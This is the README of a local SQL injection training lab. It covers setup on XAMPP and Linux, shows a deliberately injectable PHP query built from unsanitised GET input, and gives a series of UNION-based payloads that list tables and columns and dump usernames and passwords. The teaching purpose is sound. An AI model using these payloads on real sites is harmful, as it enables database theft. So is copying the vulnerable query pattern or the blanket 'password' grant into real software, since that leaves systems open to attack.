# SQL Injection Training Lab
 
This is a simple SQL Injection Lab. This installation requires small usage of storage and no special tools installation. You just need an Apache and PHP installed in your machine, then you can run this lab to learn performing SQL Injection.

SQL Injection (a.k.a sqli) is one of the most dangerous and popular cyber attack where it start with leaking data (SQL database) to take control of the server, change or delete the data or create a fake data.

This SQLi technique only works on SQL Database like MySQL (includes MariaDB), Oracle, Microsoft SQL Server and other SQL Databases. Even the noSQL Database has risen in popularity and trust, but yet, SQL Database is still in world wide industry which make SQLi attack is still relevence untill today.

Learning SQLi is easy and important especially if you work as programmer or developer, you will need this knowledge to see if your developed systems are secured or not.

# How to Install?
The installation of this lab is simple. You need an Apache Server and PHP installed! If you new to this, follow this thorough steps:

## For Windows:
1. Install XAMPP (PHP 7.4 minimum)
2. Start your XAMPP Control Panel and click start on Apache & MySQL
3. Go to "http://localhost/phpmyadmin"
4. Click on "New" on top left menu
5. Insert database name "sqli_lab"
6. Download this Github Repos and extract in "C:/xampp/htdocs"
7. Go to "http://localhost/SQL-Injection-Training-Lab"
8. Click on "Submit", then you are good to go

## For Linux
1. Install Apache `apt install apache2`
2. Install MySQL (search Google for the step depend on your linux version)
3. Install PHP `apt install php`
4. Install PHPMyAdmin (optional) `apt install phpmyadmin`
5. Start Apache & MySQL `service apache2 start` & `service mysql start`
6. Login to MySQL `sudo mysql -u root`
7. Create a new database named sqli_lab `CREATE DATABASE sqli_lab;`
8. Create database user (optional)
```
CREATE USER 'sqli'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'sqli'@'localhost' IDENTIFIED BY 'password';
FLUSH PRIVILEGES;
```
(SQL Command might differs depend on your MySQL version)

9. Go to "http://localhost/SQL-Injection-Training-Lab"
10. Insert your created database user "sqli" with password "password"
11. Click on "Submit", then you are good to go

##  Notes
If you are using Kali Linux, you can start with step 6 on Linux steps.

# Basic SQL Injection
SQLi happens when user input is not filtered/sanitize and used directly in the SQL Query. Example (in PHP):
```
$id = $_GET["id"];

$sql = "SELECT * FROM users WHERE id = '$id'";
$query = mysqli_query ...
```
The variable `$id` stored non-filtered/sanitize values take from `$_GET`. This means that the input `id` can be used to break the SQL Query inside PHP code.

## What is Payload?
Payload means the input used to manipulate the SQL Query. Most common used "payload" to check wheter the URL or site is open to SQLi or not is using single quote `'` or double quote `"` after the `id` parameters. Example:

http://unsecure-web.com/SQL-Injection-Training-Lab/index.php?id=1

Hackers will put `'` or `"` like this:

http://unsecure-web.com/SQL-Injection-Training-Lab/index.php?id=1'

Or

http://unsecure-web.com/SQL-Injection-Training-Lab/index.php?id=1"


The use of `'` or `"` is to end a comparison statement in the SQL Query. Example:
```
//without quote(s)
...
$sql = "SELECT * FROM users WHERE id = '1'";

//with quote
...
$sql = "SELECT * FROM users WHERE id = '1''" 
```
The above code shows that there will be an addtional `'` character after the input which makes the SQL Query broke. This means the quote `'` is working for current attack because the SQL Query uses the same single quote as our payload.

This payload is not stop on the quotes, it can be elaborate untill we can insert a complete SQL Query in the input. Here's few example how the payload is elaborated:
```
...index.php?id=1'

//commenting the other SQL after the input
...index.php?id=1'--+

...index.php?id=1'+order+by1--+
...index.php?id=1'+union+all+select+1,2,3,4,5--+
...index.php?id=-1'+union+all+select+1,2,3,4,5--+

//List all table in current database
...index.php?id=-1'+union+all+select+1,group_concat(table_name),3,4,5+from+information_schema.tables+where+table_schema=database()--+

//List all column in specific table
...index.php?id=-1'+union+all+select+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_schema=database()+and+table_name='tbl_users'--+

//List all data in specific table
...index.php?id=-1'+union+all+select+1,group_concat(username),group_concat(password),4,5+from+tbl_users--+
```
These above is the basic payload we can use to perform a SQLi attack. There are more payload can be created depend on how strong is you knowledge on SQL Command.

# How to Learn from this repos?
This repos are created for our MyOPECS (Malaysia Open Cyber Security) Training. If you are a Malaysian and can speak Malay, then you can watch my videos on YouTube or follow our weekly hacking training every Thurday night Live on TikTok.

If you are not fit in the criteria above, then you can keep reading the README.md in every folder from Level A-N. (will be updated from time to time)
